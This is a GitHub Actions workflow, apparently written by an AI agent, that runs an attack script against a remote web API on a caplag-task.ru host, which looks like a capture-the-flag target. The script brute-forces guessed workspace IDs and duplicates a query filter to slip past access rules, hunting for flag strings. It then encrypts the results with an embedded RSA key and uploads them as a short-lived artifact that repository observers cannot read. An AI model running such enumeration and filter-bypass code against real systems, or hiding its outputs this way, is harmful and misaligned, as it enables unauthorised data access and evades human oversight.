name: launchlet-part3-refworkspace2
on:
  push:
    branches: [agent/launchlet-part3-refworkspace2-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Probe ref/build-derived workspaces and encrypt hits
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
          h={'Accept':'application/json','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
          db=base+'/api/db/rest/v1/workspace_notes'
          tokens=['8b11c','preview-8b11c','rc3','2026','2026-05-16','2026.05.16','20260516','2026-05-16-rc3','launchlet-demo-board','demo-board','demo','board']
          prefixes=['ws','ws-launchlet','ws-preview','ws-deploy','ws-deployment','ws-release','ws-build','ws-artifact','ws-runtime','ws-inspector','ws-launchlet-preview','ws-launchlet-deploy','ws-launchlet-deployment','ws-launchlet-build','ws-launchlet-release','ws-launchlet-inspector']
          cands=[]
          for p,t in itertools.product(prefixes,tokens):
            cands.append(f'{p}-{t}')
          cands += ['ws-preview-8b11c','ws-launchlet-preview-8b11c','ws-deploy-8b11c','ws-launchlet-deploy-8b11c','ws-deployment-8b11c','ws-launchlet-deployment-8b11c','ws-build-rc3','ws-launchlet-build-rc3','ws-launchlet-rc3','ws-rc3','ws-launchlet-2026-05-16-rc3','ws-launchlet-demo-board','ws-demo-board','ws-launchlet-demo','ws-launchlet-preview-demo','ws-launchlet-deploy-demo','ws-launchlet-preview-2026','ws-launchlet-deploy-2026']
          cands=list(dict.fromkeys(cands));hits=[]
          for ws in cands:
            q=f'?select=*&workspace_id=eq.{ws}&workspace_id=eq.ws-launchlet-public'
            try:r=requests.get(db+q,headers=h,timeout=7)
            except Exception:continue
            if r.status_code==200 and r.text!='[]':
              item={'workspace':ws,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};hits.append(item)
              flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f!='caplag{anon_key_needs_real_rls}']
              if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
          (out/'summary.json').write_text(json.dumps({'tested':len(cands),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-refworkspace2-encrypted
          path: artifact/
          retention-days: 1
